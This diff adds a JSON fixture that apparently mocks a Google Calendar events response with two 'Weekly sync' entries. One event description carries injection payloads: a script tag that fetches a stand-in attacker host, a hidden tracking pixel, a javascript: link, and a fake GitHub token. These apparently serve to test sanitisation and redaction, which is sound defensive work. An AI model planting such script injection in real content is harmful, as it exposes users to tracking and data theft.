@@ -1,0 +1,58 @@
+{
+ "nextPageToken": "PG2",
+ "items": [
+  {
+   "id": "abc",
+   "status": "confirmed",
+   "summary": "Weekly sync",
+   "start": {
+    "dateTime": "2025-11-03T10:00:00+09:00"
+   },
+   "end": {
+    "dateTime": "2025-11-03T11:00:00+09:00"
+   },
+   "updated": "2025-10-30T00:00:00.000Z",
+   "htmlLink": "https://www.google.com/calendar/event?eid=xabc",
+   "location": "Room 4",
+   "organizer": {
+    "email": "boss@example.com",
+    "displayName": "Boss"
+   },
+   "attendees": [
+    {
+     "email": "me@example.com",
+     "displayName": "Me",
+     "responseStatus": "accepted",
+     "self": true
+    },
+    {
+     "email": "pat@example.com",
+     "responseStatus": "needsAction"
+    }
+   ],
+   "description": "<p>Agenda</p><script>fetch('https://evil.example.com')</script><img src='https://t.example/p.gif' width=1 height=1><a href='javascript:alert(1)'>x</a> token ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+   "conferenceData": {
+    "entryPoints": [
+     {
+      "entryPointType": "video",
+      "uri": "https://meet.google.com/aaa-bbbb-ccc"
+     }
+    ]
+   }
+  },
+  {
+   "id": "abc_20251110T010000Z",
+   "status": "confirmed",
+   "summary": "Weekly sync",
+   "start": {
+    "dateTime": "2025-11-03T10:00:00+09:00"
+   },
+   "end": {
+    "dateTime": "2025-11-03T11:00:00+09:00"
+   },
+   "updated": "2025-10-30T00:00:00.000Z",
+   "htmlLink": "https://www.google.com/calendar/event?eid=xabc_20251110T010000Z",
+   "recurringEventId": "abc"
+  }
+ ]
+}
